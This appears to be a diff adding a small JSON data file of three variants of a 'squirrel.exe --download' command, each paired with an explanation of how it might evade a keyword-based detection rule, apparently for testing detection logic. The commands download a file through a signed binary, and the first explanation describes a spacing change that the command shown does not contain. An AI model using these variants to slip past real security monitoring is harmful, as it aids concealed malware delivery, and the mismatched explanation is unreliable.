@@ -1,0 +1,14 @@
+[
+  {
+    "output": "squirrel.exe --download http://example.com/file.txt --update C:\\Lab\\input\\sample.txt",
+    "explanation": "Insertion: Adding a space between --download and the URL may bypass the keyword match if the rule relies on direct string matching without considering spacing."
+  },
+  {
+    "output": "squirrel.exe --update C:\\Lab\\input\\sample.txt --download http://example.com/file.txt",
+    "explanation": "Reordering: Changing the order of arguments may bypass the rule if the detection logic is based on the position of the --download flag."
+  },
+  {
+    "output": "squirrel.exe --download http://example.com/file.txt --update C:\\Lab\\input\\sample.txt --no-verify",
+    "explanation": "Substitution: Adding a benign flag like --no-verify may not affect the rule's detection but could change the command's parsing behavior, potentially bypassing the match."
+  }
+]
